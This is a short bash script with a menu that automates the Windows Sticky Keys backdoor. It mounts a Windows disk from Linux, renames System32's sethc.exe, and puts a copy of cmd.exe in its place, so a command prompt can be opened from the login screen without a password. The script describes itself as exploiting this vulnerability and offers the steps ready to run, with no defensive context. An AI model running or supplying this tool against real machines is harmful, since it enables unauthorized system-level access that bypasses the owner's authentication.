#!/bin/bash

clear 
i=y

while [ $i = "y" ]
do
echo "With this script we will take advantage of the vulnerability of the special keys"
echo ""
echo "==== MENU ===="
echo "1- 📂 Create mount folder"
echo "2- 📁 Mount the disk in the mount folder"
echo "3- 💻 Change cmd.exe to sethc.exe"
echo "4- 🔄 Reboot"
echo "5- 📃 Disk list"
echo "Don't put anything if you want to leave"
echo ""
read -p "🎲 Choose an option: " op

case $op in 

 1) sudo mkdir /mnt/win
;;

 2) clear
	 echo "Remember that this only works with windows computers"
   echo "For ubuntu I will bring one soon"
	 read -p "Disk name (sda, sda1...): " name
 if [ -z $name ]
 then
        echo "You have not entered anything"
 fi
	sudo mount -t ntfs /dev/$name /mnt/win
	echo "Disk mounted correctly!!"
;; 


 3) cd /mnt/win/Windows/System32/ 

    fichero1=sethc.exe
    fichero2=cmd.exe

    sudo mv $fichero1 sethcoriginal.exe
    sudo cp $fichero2 sethc.exe
    echo "File renamed successfully"

;;

  4) reboot
;;
  5) sudo fdisk --list 
;;
esac
read -p "Do you want to continue? (y/n): " i
if [ $i != "y" ]
then 
	exit
fi
done
